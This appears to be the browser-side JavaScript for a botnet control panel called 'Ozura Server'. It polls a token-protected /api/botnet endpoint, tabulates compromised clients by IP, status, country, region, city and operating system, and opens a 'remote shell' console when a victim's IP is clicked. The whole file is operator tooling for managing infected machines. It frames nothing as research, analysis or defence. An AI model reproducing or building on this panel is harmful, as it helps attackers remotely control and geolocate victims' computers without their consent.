const table = document.getElementById('table');
const info = document.getElementById('info');
const title = document.getElementById('title');

setInterval(() => {
    const time = Date.now();
    fetch(`${config.baseURL}/api/botnet`, {
        headers: {
            'token': config.token,
            'Content-Type': 'application/json'
        }
    })
        .then(res => res.json())
        .then(data => {
            title.textContent = `${data.message.online}/${data.message.total} clients online ${Date.now() - time}ms`;
            data.message.clients.forEach(client => {
                const id = document.getElementById(`client-${client.ip}`);
                id.textContent = client.online === false ? 'Offline' : 'Online';
                const idmap = document.getElementById(`map-client-${client.ip}`);
                idmap.textContent = client.online === false ? 'Offline' : 'Online';
            });
        });
}, 2500);

fetch(`${config.baseURL}/api/botnet`, {
    headers: {
        'token': config.token,
        'Content-Type': 'application/json'
    }
})
    .then(res => res.json())
    .then(data => {
        info.textContent = `Windows: ${data.message.Windows}, Linux: ${data.message.Linux}, Java: ${data.message.Java}, Darwin: ${data.message.Darwin}`
        const clients = data.message.clients;
        clients.forEach(client => {
            const entry = document.createElement('tr');
            const ip = document.createElement('td');
            const status = document.createElement('td');
            const country = document.createElement('td');
            const region = document.createElement('td');
            const city = document.createElement('td');
            const os = document.createElement('td');

            status.setAttribute('id', `client-${client.ip}`);
            ip.setAttribute('id', `table-client-${client.ip}`);
            ip.setAttribute('class', 'table-ip');
            ip.setAttribute('href', '#');

            ip.addEventListener('click', () => {
                // if (client.online === false) return alert(`The client ${client.ip} is offline`);
                document.getElementById('popup-form').style.display = "block";
                remoteTerm.log(`Welcome to the remote shell`, 'prefix', client.ip);
            });

            ip.textContent = client.ip;
            status.textContent = client.online === false ? 'Offline' : 'Online';
            country.textContent = client.location.country;
            region.textContent = client.location.region;
            city.textContent = client.location.city;
            os.textContent = client.os;

            entry.append(ip);
            entry.append(status);
            entry.append(country);
            entry.append(region);
            entry.append(city);
            entry.append(os);
            table.append(entry);
        });
    })
    .catch(() => {
        return alert('Ozura Server is offline');
    });